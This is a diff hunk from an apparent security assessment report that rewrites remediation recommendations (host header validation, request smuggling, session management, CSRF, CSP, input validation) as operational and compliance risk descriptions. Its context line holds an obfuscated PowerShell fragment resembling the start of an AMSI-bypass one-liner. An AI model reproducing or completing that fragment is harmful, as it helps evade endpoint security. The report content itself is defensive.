@@ -36,17 +36,17 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 
 =============================================================
 
-It is recommended to validate and sanitize the Host header in all incoming requests to prevent host header injection vulnerabilities.
+Operational Risk:
 
-It is recommended to ensure consistent HTTP request parsing across all server components to prevent HTTP request smuggling attacks.
+Privilege Escalation: This can lead to unauthorized access and misuse of system resources, disrupting operational integrity.
+Malicious File Upload Vulnerability: Can result in the compromise of server resources and data integrity, impacting operational availability.
+Host Header Injection: Can lead to request manipulation and unauthorized access, disrupting application functionality and availability.
+HTTP Request Smuggling: Can manipulate request handling, leading to potential data corruption or unauthorized access.
+Improper Session Management: Can result in unauthorized access and session hijacking, disrupting user activities and application functionality.
+Content Spoofing: Can deceive users with misleading content, potentially damaging user trust and application reputation.
+Regulatory/Compliance Risk:
 
-It is recommended to implement secure session management practices, including setting appropriate session timeouts and ensuring session tokens are unique and securely generated.
-
-CSRF: It is recommended to implement CSRF tokens and validate them on the server side to prevent cross-site request forgery attacks.
-
-Content Spoofing: It is recommended to validate and sanitize all user inputs and encode output to prevent content spoofing vulnerabilities.
-
-Misconfigured CSP: It is recommended to configure a strict Content Security Policy (CSP) without using unsafe-inline or unsafe-eval to enhance security.
-
-Improper Input Validation: It is recommended to validate and sanitize all user inputs on both client and server sides to prevent improper input validation vulnerabilities.
+CSRF (Cross-Site Request Forgery): Non-compliance with standards that mandate protection against unauthorized actions performed on behalf of users.
+Misconfigured CSP (Content Security Policy): Non-compliance with security standards that require secure configurations to protect user data and prevent security breaches.
+Improper Input Validation: Non-compliance with data protection standards (e.g., PCI DSS) due to vulnerabilities that expose sensitive information to unauthorized access.
 
